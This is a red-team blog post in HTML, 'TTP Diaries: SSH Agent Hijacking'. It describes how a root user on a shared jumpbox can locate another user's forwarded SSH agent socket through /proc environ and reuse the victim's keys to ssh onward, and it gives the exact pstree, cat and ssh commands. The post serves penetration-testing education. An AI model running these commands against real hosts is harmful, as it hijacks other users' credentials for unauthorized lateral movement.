<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta property="og:title" content=" TTP Diaries: SSH Agent Hijacking &middot;  Embrace The Red" />
  
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/" />
  
  
  <meta property="og:type" content="article" />
  
  <meta property="og:article:published_time" content="2022-10-16T11:30:29-07:00" />
  
  <meta property="og:article:tag" content="pentest" />
  
  <meta property="og:article:tag" content="red" />
  
  <meta property="og:article:tag" content="ttp" />
  
  

  <title>
     TTP Diaries: SSH Agent Hijacking &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
  
  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  

  
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@wunderwuzzi23">
<meta name="twitter:title" content="TTP Diaries: SSH Agent Hijacking">
<meta name="twitter:description" content="Abusing SSH Agent for lateral movement!">
<meta name="twitter:image" content="https://embracethered.com/blog/images/2022/ssh-hijacking.png">

<meta name="twitter:creator" content="@wunderwuzzi23">



  
</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;Subscribe
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">TTP Diaries: SSH Agent Hijacking</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2022-10-16T11:30:29-07:00">
          Oct 16, 2022
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/pentest">#pentest</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ttp">#ttp</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p>There are some neat TTPs that I don&rsquo;t use frequently, and if the time arises, I need to dig up details again. So, I figured to write some of them down, starting with <strong>SSH Agent Hijacking</strong>.</p>
<h3 id="what-is-ssh-agent-hijacking">What is SSH Agent Hijacking?</h3>
<p>Short story, if you have keys added to an SSH Agent an adversary with root permissions can use them. If you forward the SSH Agent to another host, an adversary with root permission on that other host can exploit and leverage your keys as well.</p>
<h3 id="jumpboxes">Jumpboxes</h3>
<p>The typical scenario where this is quite powerful are <code>jumpboxes</code>. One can query the SSH Agent&rsquo;s socket of others and then connect the <code>ssh</code> client to that socket, and leverage the victim&rsquo;s SSH private keys that way.</p>
<p>Forwarding is typically done by updating the <code>ssh_config</code> file to include:</p>
<pre tabindex="0"><code>    ForwardAgent yes
</code></pre><p>Manually this can be done by using <code>ssh -A</code>.</p>
<h3 id="ssh_auth_sock">SSH_AUTH_SOCK</h3>
<p>What makes this all possible is the environment variable <code>SSH_AUTH_SOCK</code>.</p>
<p>On that <code>jumpbox</code> with multiple users logged in using SSH Agent forwarding an adversary can:</p>
<ol>
<li>Query for other user&rsquo;s processes, e.g. via <code>ps aux ww</code> or <code>pstree -p victim</code>.</li>
<li>Take note of a process id (PID) of a shell started by the <code>sshd</code>, like for instance <code>bash</code></li>
<li><code>grep</code> through the env variables (as root) of the process to find the <code>SSH_AUTH_SOCK</code></li>
<li>Use that socket and pivot to the same or another machine as the victim user</li>
</ol>
<p>That&rsquo;s it.</p>
<h3 id="commands">Commands</h3>
<p>Command line wise, it looks like this:</p>
<p><img src="/blog/images/2022/ssh-hijacking.png" alt="SSH Agent"></p>
<ol>
<li>Find the sshd that launched the users shell (e.g. bash).</li>
</ol>
<pre tabindex="0"><code>$ pstree -p sarah | grep sshd
</code></pre><ol start="2">
<li>Take note of the PID of the bash process and fill in the PID accordingly when running:</li>
</ol>
<pre tabindex="0"><code>$ sudo cat /proc/{PID}/environ | tr &#39;\0&#39; &#39;\n&#39; | grep SSH_AUTH_SOCK 
</code></pre><ol start="3">
<li>If all works you can ssh to other machines where sarah has access to.</li>
</ol>
<pre tabindex="0"><code>$ sudo SSH_AUTH_SOCK={value} ssh sarah@localhost
</code></pre><p>This is a neat TTP that is especially impactful when an adversary gains access to a shared host.</p>
<p>Greetings.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dfe66853-a519-4b96-81b6-e7cbbdfc8c53&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">Endpoint Protection - SSH and ssh-agent</a></li>
<li><a href="https://attack.mitre.org/techniques/T1563/001/">MITRE Attack TTP T1563 - SSH Hijacking</a></li>
</ul>
<h3 id="appendix">Appendix</h3>
<p>Just some random notes around launching ssh-agent</p>
<p>When launching <code>ssh-agent</code> it will return the commands to the set the environment variable accordingly. This is also the reason why SSH Agent must be launched using an <code>eval</code> statement to set the <code>SSH_AUTH_SOCK</code> variable.</p>
<pre tabindex="0"><code>eval $(ssh-agent -s)
</code></pre><p>If you don&rsquo;t do this, you get <code>Could not open a connection to your authentication agent.</code> as an error message when trying to list or add keys via <code>ssh-add</code>.</p>
<pre tabindex="0"><code>ssh-add -l
The agent has no identities.
</code></pre>
  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next"><a href="https://embracethered.com/blog/posts/2022/ropci-so-you-think-you-have-mfa-azure-ad/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="https://embracethered.com/blog/posts/2022/gospray-active-directory-ldap-password-spraying/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2026
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

